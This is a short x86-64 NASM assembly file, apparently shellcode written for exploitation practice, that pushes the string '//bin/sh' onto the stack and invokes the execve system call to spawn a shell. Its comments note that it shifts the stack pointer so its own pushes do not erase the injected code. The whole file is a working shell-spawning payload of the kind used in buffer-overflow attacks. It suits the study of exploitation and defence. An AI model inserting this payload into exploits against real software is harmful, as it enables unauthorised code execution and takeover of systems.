BITS 64

section .text
    global _start

_start:
    sub rsp, 0x200                  ; move away stack pointer from current code
                                    ; code will be store in the stack so it may be
                                    ; erased by its own push
    xor rax, rax
    push rax                        ; NULL terminator

    mov rbx, "//bin/sh"             ; 8-bytes, loaded as 64 bits 
    push rbx                        ; save "//bin/sh" onto the stack
    mov rdi, rsp                    ; rdi (1st argument) = pointer to "/bin/sh"

    xor rsi, rsi                    ; argv = NULL
    xor rdx, rdx                    ; envp = NULL

    mov rax, 0x3b                   ; syscall execve = 59
    syscall